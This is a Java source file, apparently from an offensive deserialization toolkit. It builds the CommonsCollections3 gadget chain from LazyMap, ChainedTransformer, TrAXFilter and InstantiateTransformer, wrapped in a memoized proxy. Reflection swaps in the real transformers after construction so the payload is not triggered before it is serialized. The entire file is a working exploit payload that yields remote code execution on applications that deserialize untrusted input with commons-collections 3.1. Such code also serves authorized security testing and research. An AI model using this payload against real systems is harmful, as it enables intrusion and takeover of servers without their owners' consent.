package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.Gadgets;
import com.summersec.attack.deser.util.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import javax.xml.transform.Templates;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;



@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections3 implements ObjectPayload<Object> {
    @Override
    public Object getObject(Object templatesImpl) throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] { (Transformer)new ConstantTransformer(Integer.valueOf(1)) });

        Transformer[] transformers = { (Transformer)new ConstantTransformer(TrAXFilter.class), (Transformer)new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { templatesImpl }) };


        Map<Object, Object> innerMap = new HashMap<>();

        Map lazyMap = LazyMap.decorate(innerMap, (Transformer)chainedTransformer);

        Map mapProxy = (Map)Gadgets.createMemoitizedProxy(lazyMap, Map.class, new Class[0]);

        InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);

        return handler;
    }
}


